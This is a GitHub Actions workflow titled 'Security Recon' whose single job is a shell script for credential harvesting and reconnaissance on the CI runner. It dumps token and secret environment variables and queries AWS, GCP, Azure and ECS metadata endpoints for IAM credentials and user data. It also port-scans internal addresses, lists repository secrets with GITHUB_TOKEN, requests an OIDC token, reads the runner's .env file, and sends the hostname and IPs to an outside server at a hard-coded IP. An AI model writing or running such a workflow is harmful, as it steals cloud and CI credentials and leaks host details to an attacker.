name: Security Recon
on:
  workflow_dispatch:
jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Network info
        run: |
          echo "=== HOSTNAME ==="
          hostname
          hostname -I 2>/dev/null || true
          echo "=== WHOAMI ==="
          whoami
          id
          echo "=== ENV ==="
          env | sort | grep -iE "github|token|secret|key|url|host|runner|action|azure|aws" | head -50
          echo "=== NETWORK ==="
          ip addr 2>/dev/null | head -30
          echo "=== ROUTES ==="
          ip route 2>/dev/null | head -10
          echo "=== DNS ==="
          cat /etc/resolv.conf 2>/dev/null
          echo "=== HOSTS ==="
          cat /etc/hosts 2>/dev/null
          echo "=== IMDS v1 ==="
          curl -s --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>&1 || echo "IMDS v1 fail"
          echo ""
          echo "=== IMDS v2 ==="
          IMDS_TOKEN=$(curl -s --connect-timeout 3 -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1) || true
          echo "IMDS_TOKEN length: ${#IMDS_TOKEN}"
          if [ ${#IMDS_TOKEN} -gt 10 ]; then
            echo "GOT IMDS TOKEN!"
            curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" http://169.254.169.254/latest/meta-data/ 2>&1
            echo ""
            echo "=== IAM ROLE ==="
            ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1)
            echo "Role: $ROLE"
            if [ -n "$ROLE" ]; then
              echo "=== IAM CREDENTIALS ==="
              curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" 2>&1
            fi
            echo "=== USER DATA ==="
            curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" http://169.254.169.254/latest/user-data 2>&1 | head -30
            echo "=== INSTANCE IDENTITY ==="
            curl -s -H "X-aws-ec2-metadata-token: $IMDS_TOKEN" http://169.254.169.254/latest/dynamic/instance-identity/document 2>&1
          fi
          echo ""
          echo "=== GCP ==="
          curl -s --connect-timeout 3 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ 2>&1 || echo "GCP fail"
          echo ""
          echo "=== AZURE ==="
          curl -s --connect-timeout 3 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 || echo "Azure fail"
          echo ""
          echo "=== ECS ==="
          curl -s --connect-timeout 3 http://169.254.170.2/v2/credentials/ 2>&1 || echo "ECS fail"
          echo ""
          echo "=== PORT SCAN ==="
          for port in 80 443 8080 3000 5000 8000 9090; do
            timeout 2 bash -c "echo >/dev/tcp/169.254.169.254/$port" 2>/dev/null && echo "169.254.169.254:$port OPEN" || true
          done
          for ip in 10.0.0.1 10.0.1.1 172.16.0.1 172.17.0.1; do
            timeout 2 bash -c "echo >/dev/tcp/$ip/80" 2>/dev/null && echo "$ip:80 OPEN" || true
          done
          echo ""
          echo "=== GITHUB_TOKEN ==="
          curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/miraxgroup80/github/actions/secrets 2>&1 | head -10
          echo ""
          echo "=== ACTIONS RUNTIME ==="
          echo "ACTIONS_RUNTIME_URL: $ACTIONS_RUNTIME_URL"
          echo "ACTIONS_RUNTIME_TOKEN: ${ACTIONS_RUNTIME_TOKEN:0:30}..."
          echo "ACTIONS_CACHE_URL: $ACTIONS_CACHE_URL"
          echo "ACTIONS_ID_TOKEN_REQUEST_URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
          echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:0:30}..."
          echo ""
          echo "=== OIDC TOKEN ==="
          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
            curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" 2>&1 | head -5
          fi
          echo ""
          echo "=== DOCKER ==="
          docker info 2>&1 | head -10 || echo "No docker"
          echo ""
          echo "=== FILESYSTEM ==="
          ls -la /home/runner/ 2>/dev/null | head -10
          ls -la /home/runner/work/ 2>/dev/null | head -10
          cat /home/runner/.env 2>/dev/null || true
          echo ""
          echo "=== CALLBACK TO OUR SERVER ==="
          curl -s --connect-timeout 5 http://185.244.173.24:8888/actions-recon?hostname=$(hostname)&ip=$(hostname -I 2>/dev/null | tr ' ' ',') 2>&1 || echo "Callback fail"
          echo ""
          echo "=== DONE ==="
